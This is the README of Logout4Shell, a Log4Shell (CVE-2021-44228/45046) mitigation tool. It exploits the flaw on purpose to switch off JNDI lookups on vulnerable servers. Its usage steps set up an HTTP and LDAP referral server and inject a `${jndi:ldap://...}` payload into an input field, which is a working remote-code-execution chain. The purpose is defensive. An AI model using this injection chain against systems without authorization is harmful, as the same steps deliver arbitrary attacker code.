## Description 

A vulnerability impacting Apache Log4j versions 2.0 through 2.14.1 was disclosed on the project’s Github on December 9, 2021. 
The flaw has been dubbed “Log4Shell,”, and has the highest possible severity rating of 10. Software made or
managed by the Apache Software Foundation (From here on just "Apache") is pervasive and comprises nearly a third of all
web servers in the world—making this a potentially catastrophic flaw.
The Log4Shell vulnerability CVE-2021-44228 was published on 12/9/2021 and allows remote code execution on vulnerable servers.

On 12/14/2001 the Apache software foundation disclosed CVE-2021-45046 which was patched in log4j version 2.16.0.

While the best mitigation against these vulnerabilities is to patch log4j to
~~2.15.0~~2.16.0 and above, in Log4j version (>=2.10) this behavior can be mitigated by
setting system property `log4j2.formatMsgNoLookups` to `true` or by removing
the JndiLookup class from the classpath. 

~~Additionally, if the server has Java runtimes >= 8u121, then by default, the
settings `com.sun.jndi.rmi.object.trustURLCodebase` and
`com.sun.jndi.cosnaming.object.trustURLCodebase` are set to “false”, mitigating this risk.~~
Using known techniques for exploitation of java serialization, it was shown that all versions of java are now
vulnerable.

However, enabling these system property requires access to the vulnerable servers as well as a restart. 
The [Cybereason](https://www.cybereason.com) research team has developed the
following code that _exploits_ the same vulnerability and the payload therein
forces the logger to reconfigure itself with the vulnerable setting disabled -
this effectively blocks any further attempt to exploit Log4Shell on this server. In addition, the payload also searches
for all `LoggerContext` and removes the JNDI `Interpolator` preventing the abuses disclosed in CVE-2021-45046. 

This Proof of Concept is based on [@tangxiaofeng7](https://github.com/tangxiaofeng7)'s [tangxiaofeng7/apache-log4j-poc](https://github.com/tangxiaofeng7/apache-log4j-poc)

However, this project attempts to fix the vulnerability by using the bug against itself.

## Supported versions
Logout4Shell supports log4j version 2.0 - 2.14.1

## How it works
On versions (>= 2.10.0) of log4j that support the configuration `FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS`, this value is
set to `True` disabling the lookup mechanism entirely. In addition (and specifically in versions < 2.10.0) the payload searches all
existing `LoggerContexts` and removes the JNDI key from the `Interpolator` used to process `${}` fields.

In both cases, this change will revert when the JVM restarts. 

We're considering a more permanent fix - for example, edit the jar on disk of the vulnerable server so that the class
JndiLookup will not be instantiated. We'd love community feedback on such an idea and it's associated risks.

## How to use

1. Download this repository and build it 

   1.1 `git clone https://github.com/cybereason/Logout4Shell.git`

   1.2 build it - `mvn package`

   1.3 `cd target/classes`

   1.4 run the webserver - `python3 -m http.server 8888`

2. Download, build and run Marshalsec's ldap server

   2.1 `git clone https://github.com/mbechler/marshalsec.git`

   2.2 `mvn package -DskipTests`

   2.3 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCE"`

3. To immunize a server

   3.1 enter `${jndi:ldap://<IP_OF_LDAP_SERVER_FROM_STEP_2>:1389/a}` into a vulnerable field (such as user name)
